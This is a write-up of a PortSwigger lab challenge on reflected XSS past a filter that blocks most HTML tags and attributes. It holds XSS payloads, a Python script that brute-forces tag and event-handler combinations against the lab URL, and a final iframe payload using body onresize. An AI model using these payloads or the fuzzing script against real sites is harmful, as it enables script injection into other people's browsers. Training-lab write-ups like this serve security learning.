# Reflected XSS into HTML context with most tags and attributes blocked

In this challenge, we need to perform a Refelcted XSS attack in a site that applying filtering on most html tags and attributes.

Just like most challenges before, we're going to perform this attack in the search bar. Now let's try with some tags that we use as attacking attempts:

```html
<script>alert(1)</script>
<img src='x' onerror=alert()>
```

Result:
<img style="margin-top: 20px;" src="https://github.com/DJumanto/Portswigger-XSS/blob/main/Exploiting%20XSS%20to%20perform%20CSRF/Account.png?raw=true" alt="common-tag-attempt">

Seems like we're not able to use common tags. So i tried other tags and found out that ``<body>`` tag was allowed. Next thing we need to find is all attribute that allowed. We can find them in [Portswigger XSS CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

I create a python script that perform a bruteforce on attribute, to see which one was allowed. Here are attributes we able to use:
- onratechange
- onscrollend
- onbeforeinput
- onresize

Actually we can perform the attack with only combination of body tag and 4 attributes we found. But I want to know if there's any tag we able to use other than body tag. here my final code to find which combination is the best:

```python
import requests as req

#list of attribute that we able to use after bruteforce attribute
attribute = {"onratechange","onscrollend","onbeforeinput","onresize"}

#list of tags that possible to use
tags = {"a","abbr","acronym","address","applet","area","article","aside","audio","b","base","bdi","bdo","big","blink","blockquote","body","br","button","canvas","caption","center","cite","code","col","colgroup","command","content","data","datalist","dd","del","details","dfn","dialog","dir","div","dl","dt","element","em","embed","fieldset","figcaption","figure","font","footer","form","frame","frameset","h1","head","header","hgroup","hr","html","i","iframe","image","img","input","ins","kbd","keygen","label","legend","li","link","listing","main","map","mark","marquee","menu","menuitem","meta","meter","multicol","nav","nextid","nobr","noembed","noframes","noscript","object","ol","optgroup","option","output","p","param","picture","plaintext","pre","progress","q","rb","rp","rt","rtc","ruby","s","samp","script","section","select","shadow","slot","small","source","spacer","span","strike","strong","style","sub","summary","sup","svg","<svg><animate>","<svg><animatemotion>","<svg><animatetransform>","<svg><set>","table","tbody","td","template","textarea","tfoot","th","thead","time","title","tr","track","tt","u","ul","var","video","wbr","xmp",
}


def bruteTagAttribute(tag,attr):
    payload = f"<{tag} {attr}=print()></{tag}>"
    r = req.get(f"https://0ace000303a0e49180ffdf7a00cb0021.web-security-academy.net/?search={payload}")
    if(r.status_code == 200):
        print(payload)
    
for tag in tags:
    for attr in attribute:
        bruteTagAttribute(tag, attr)
```
well, in the end, the combinations was still body tag and those 4 attributes. Here are lists of combination that we able to use:

```html
<body onscrollend=print()></body>
<body onresize=print()></body>
<body onratechange=print()></body>
<body onbeforeinput=print()></body>
```
I directly use **``onresize()``** event handling to apply the attack. It will trigger the **``print()``** function when the user windows resized (we can trigger it without their action).

Insert the payload on the exploit server then deliver it:
```html
<iframe src="https://0ace000303a0e49180ffdf7a00cb0021.web-security-academy.net/?search=<body onresize=print()></body>" onload=this.width='200px'></iframe>
```

Result:
<img style="margin-top: 20px;" src="https://github.com/DJumanto/Portswigger-XSS/blob/main/Exploiting%20XSS%20to%20perform%20CSRF/Account.png?raw=true" alt="Result">